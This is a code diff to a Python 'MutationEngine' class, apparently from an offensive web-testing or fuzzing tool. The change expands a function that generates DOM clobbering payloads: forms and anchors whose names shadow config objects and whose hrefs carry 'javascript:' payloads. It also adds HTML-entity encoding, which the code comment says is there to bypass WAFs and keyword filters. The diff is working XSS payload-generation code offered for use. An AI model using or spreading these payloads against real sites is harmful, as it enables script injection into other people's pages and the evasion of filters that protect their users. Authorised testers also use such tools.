@@ -597,15 +597,32 @@ class MutationEngine:
     def apply_dom_clobbering(payload: str) -> List[str]:
         """Wrap payload inside DOM Clobbering configurations to hijack global settings."""
         action = payload
-        if "javascript:" in action.lower():
-            action = action.replace("javascript:", "")
+        js_payload = action
+        if "javascript:" in js_payload.lower():
+            js_payload = js_payload.replace("javascript:", "")
             
         variants = []
-        variants.append(f'<form name="authConfig" data-next="javascript:{action}"></form>')
-        variants.append(f'<form name="config" data-next="javascript:{action}"></form>')
-        variants.append(f'<form name="settings" data-next="javascript:{action}"></form>')
-        variants.append(f'<form name="authConfig"><input name="dataset" value="{{\\"next\\":\\"javascript:{action}\\"}}"></form>')
-        variants.append(f'<iframe name="authConfig" srcdoc="&lt;script&gt;parent.{action}&lt;/script&gt;"></iframe>')
+        config_names = ["config", "authConfig", "settings", "options", "setup", "env", "app"]
+        property_names = ["url", "src", "path", "href", "endpoint", "callback", "redirect"]
+        
+        # 1. Base forms (legacy/standard clobbering)
+        for name in config_names[:3]:
+            variants.append(f'<form name="{name}" data-next="javascript:{js_payload}"></form>')
+            variants.append(f'<form name="{name}"><input name="dataset" value="{{\\"next\\":\\"javascript:{js_payload}\\"}}"></form>')
+            
+        # 2. Linked/HTMLCollection Clobbering (Crucial for nested lookups: window.config.url)
+        for name in config_names[:3]:
+            for prop in property_names[:3]:
+                # Dual anchors mapping property -> string representation
+                variants.append(f'<a id="{name}"></a><a id="{name}" name="{prop}" href="javascript:{js_payload}"></a>')
+                variants.append(f'<form id="{name}"><a name="{prop}" href="javascript:{js_payload}"></a></form>')
+                
+                # HTML Entity encoded variants to bypass WAF / strict input filtering on keywords (like 'javascript', parentheses, etc.)
+                raw_href = f"javascript:{js_payload}"
+                encoded_href = "".join(f"&#{ord(c)};" for c in raw_href)
+                variants.append(f'<a id="{name}"></a><a id="{name}" name="{prop}" href="{encoded_href}"></a>')
+                variants.append(f'<form id="{name}"><a name="{prop}" href="{encoded_href}"></a></form>')
+                
         return variants
 
     @staticmethod
